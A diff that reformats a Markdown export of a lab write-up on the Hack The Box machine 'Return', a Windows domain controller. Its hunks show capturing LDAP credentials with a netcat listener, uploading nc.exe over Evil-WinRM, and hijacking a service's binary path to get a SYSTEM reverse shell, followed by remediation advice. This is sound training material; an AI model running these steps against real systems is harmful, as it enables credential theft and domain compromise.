@@ -1,8 +1,8 @@
-# Return to Sender: Auditing Printer Vulnerabilities in Active Directory
+# Return
 
 Target: Return (Hack The Box) OS: Windows Difficulty: Easy Classification: Active Directory Misconfiguration & Privilege Escalation Author…
 
----
+***
 
 ### Return to Sender: Auditing Printer Vulnerabilities in Active Directory
 
@@ -10,15 +10,11 @@ Target: Return (Hack The Box) OS: Windows Difficulty: Easy Classification: Activ
 
 ![](https://cdn-images-1.medium.com/max/800/1*P0ukBlCUI9Sf7f2PEclekg.png)
 
-> <a href="https://medium.com/system-weakness/return-to-sender-auditing-printer-vulnerabilities-in-active-directory-5a93160be99d?sk=d784f8d9c27c45bf532e2fc7f0989720" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/system-weakness/return-to-sender-auditing-printer-vulnerabilities-in-active-directory-5a93160be99d?sk=d784f8d9c27c45bf532e2fc7f0989720" target="_blank">**Not a Member?? Read the Full-Story Click Here**</a>
-
-> ***⚠️ Disclaimer:*** This article is for educational and security auditing purposes only. All demonstrations were performed on the “Return” machine within the Hack The Box lab environment. Never attempt to access or modify systems without explicit written permission from the owner.
-
 ### Executive Summary
 
 This assessment targeted “Return,” a Windows Server 2019 instance acting as a Domain Controller and Print Server. The initial foothold was gained by identifying a legacy **Printer Administration Panel** hosting a misconfigured LDAP service. This vulnerability led to the exposure of cleartext credentials for the `svc-printer` account. Root privilege escalation was accomplished by identifying that the compromised service account was a member of the **Server Operators** group. This privileged membership allowed for the modification of system services, enabling the execution of a malicious binary as **NT AUTHORITY\SYSTEM**, resulting in total domain compromise.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Reconnaissance and Enumeration
 
@@ -86,10 +82,10 @@ PORT      STATE SERVICE       REASON          VERSION
 
 **1.1.2 Key Findings:**
 
-- <span id="c11f">**Port 53 (DNS) & 88 (Kerberos):** Confirms the target is a Domain Controller.</span>
-- <span id="c138">**Port 80 (HTTP):** Microsoft IIS httpd 10.0.</span>
-- <span id="f9d3">**Port 389 (LDAP):** Windows Active Directory LDAP.</span>
-- <span id="6a85">**Port 5985 (WinRM):** Open, indicating potential for remote management if credentials are found.</span>
+* **Port 53 (DNS) & 88 (Kerberos):** Confirms the target is a Domain Controller.
+* **Port 80 (HTTP):** Microsoft IIS httpd 10.0.
+* **Port 389 (LDAP):** Windows Active Directory LDAP.
+* **Port 5985 (WinRM):** Open, indicating potential for remote management if credentials are found.
 
 **1.1.3 Host Configuration:** Netexec identified the hostname as **`PRINTER.return.local`** and confirmed the OS build as Windows 10.0 Build 17763 x64 (Server 2019).
 
@@ -117,7 +113,7 @@ SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares
 
 **2.1.2 Gaining the Foothold:**
 
-1.  <span id="fac3">**Listener Setup:** We started the listener on our attack box: **`nc -lnvp 389`**.</span>
+1. **Listener Setup:** We started the listener on our attack box: **`nc -lnvp 389`**.
 
 ```
 
@@ -126,11 +122,11 @@ SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares
 listening on [any] 389 ...
 ```
 
-1.  <span id="9659">**Trigger:** On the web panel, we changed the “Server Address” (IP) to our attack IP (**`10.10.14.x`**) and clicked "Update".</span>
+1. **Trigger:** On the web panel, we changed the “Server Address” (IP) to our attack IP (**`10.10.14.x`**) and clicked "Update".
 
 ![](https://cdn-images-1.medium.com/max/800/1*EQauiku83_VZJtmOvpf3Cw.png)
 
-1.  <span id="5a51">**Capture:** The server immediately connected to our listener, transmitting the credentials in cleartext.</span>
+1. **Capture:** The server immediately connected to our listener, transmitting the credentials in cleartext.
 
 #### **Captured Data:**
 
@@ -191,8 +187,8 @@ BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandato
 
 **3.1.3 The Exploit Chain:**
 
-1.  <span id="99a2">**Upload Payload:** We uploaded a Netcat binary (**`nc.exe`**) to **`C:`**`\ProgramData\`.</span>
-2.  <span id="50c7">**Modify Service:** We targeted the **`VMTools`** service (or any other suitable service).</span>
+1. **Upload Payload:** We uploaded a Netcat binary (**`nc.exe`**) to **`C:`**`\ProgramData\`.
+2. **Modify Service:** We targeted the **`VMTools`** service (or any other suitable service).
 
 ```
 Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /usr/share/windows-resources/binaries/nc.exe C:\ProgramData\nc.exe
@@ -204,11 +200,11 @@ Data: 79188 bytes of 79188 bytes copied
 Info: Upload successful!
 ```
 
-### Step 3: The Configuration (Aiming the Gun)
+### Step 3: The Configuration (Aiming the Gun)
 
 Now we need to pick a service to hijack. A common target on Hack The Box machines is **`VMTools`** (or **`VSS`**), but any service that runs as **`LocalSystem`** will work.
 
-We are going to use the Windows Service Control (**`sc.exe`**) command to change the "Binary Path" of the service. We will tell it: *"Hey, instead of running the VM Tools, run my Netcat and connect back to me."*
+We are going to use the Windows Service Control (**`sc.exe`**) command to change the "Binary Path" of the service. We will tell it: _"Hey, instead of running the VM Tools, run my Netcat and connect back to me."_
 
 **Command:**
 
@@ -253,9 +249,9 @@ C:\Users\Administrator\Desktop>
 
 To prevent this attack path, the following changes are recommended:
 
-1.  <span id="ee63">**LDAP Security:** Configure **LDAP** Signing and Sealing **(LDAPS)** to prevent cleartext credential transmission.</span>
-2.  <span id="a7a7">**Input Validation:** The web application should not allow arbitrary IP addresses for the **LDAP** server or should require re-authentication before changing critical settings.</span>
-3.  <span id="ea69">**Least Privilege:** The **`svc-printer`** account should not be in the **Server Operators** group. Create a custom service account with only the specific permissions required for printing tasks.</span>
+1. **LDAP Security:** Configure **LDAP** Signing and Sealing **(LDAPS)** to prevent cleartext credential transmission.
+2. **Input Validation:** The web application should not allow arbitrary IP addresses for the **LDAP** server or should require re-authentication before changing critical settings.
+3. **Least Privilege:** The **`svc-printer`** account should not be in the **Server Operators** group. Create a custom service account with only the specific permissions required for printing tasks.
 
 ### 5.0 Conclusion
 
@@ -263,7 +259,7 @@ The “Return” machine demonstrates the danger of legacy administrative panels
 
 **The Verse:**
 
-> “He who walks with integrity walks securely, but he who perverts his ways will become known.”* — ****Proverbs 10:9 (NKJV)***
+> “He who walks with integrity walks securely, but he who perverts his ways will become known.”\* — \*_**Proverbs 10:9 (NKJV)**_
 
 **Connection:** The system failed because it lacked integrity — it tried to hide a secret (the password) but exposed it through a perverted configuration (allowing the IP change). True security requires integrity in network design, ensuring credentials are never transmitted to untrusted destinations.
 
@@ -271,17 +267,17 @@ The “Return” machine demonstrates the danger of legacy administrative panels
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="3ac5">Is there a specific tool you wish existed?</span>
-- <span id="f8a6">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="cdb8">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/8buAHtm2fK" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/8buAHtm2fK" title="https://discord.gg/8buAHtm2fK"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/8buAHtm2fK" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="9784a322b4c4322c092dbd39583df8bb"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 26, 2025](https://medium.com/p/5a93160be99d).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [December 26, 2025](https://medium.com/p/5a93160be99d).
 
-<a href="https://medium.com/@nicholasmullenski/return-to-sender-auditing-printer-vulnerabilities-in-active-directory-5a93160be99d" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/return-to-sender-auditing-printer-vulnerabilities-in-active-directory-5a93160be99d)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
